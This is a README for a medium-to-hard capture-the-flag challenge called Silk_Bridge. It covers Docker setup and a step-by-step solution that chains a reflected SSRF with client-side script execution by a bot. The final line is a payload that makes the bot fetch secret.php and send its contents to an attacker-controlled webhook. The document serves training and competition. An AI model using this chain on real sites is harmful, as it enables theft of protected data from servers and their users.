# Silk_Bridge
My CTF for NexZero 2024 

diffuculty:  medium - Hard
  it can take between half hour and 2 days to solve

Usage : 
1- git clone <git-repo>
2- sudo chown -R 33:33 ./bot    #to bypass AppArmor of linux
3- sudo docker compose up --build


Idea:
Bypass SSRF protection by client-side scripting and manipulation (XSS)


Solution:
1-you found reflected SSRF vulnerability in check.php with api param
2-there is 2 endpoints in robots.txt
3-secret.php is protected against ssrf
4-dev_chat.php is not protected and you learn 3 things from it : 
    - there is a javascript console in the website 
    - the is bot running from different container
    - the bot only run when there is a fetch happenning by the server itself
5-we use ssrf to trigger an internal fetch, that make the bot visite our console and execute the javascript, that make the bot visite secret.php and send us the flag
    and that's why it called silk BRIDGE


Script:
api=http://web/console.php?cmd=fetch('http://web/secret.php').then(res=>res.text()).then(data=>fetch('<webhook>?flag='+encodeURIComponent(data))

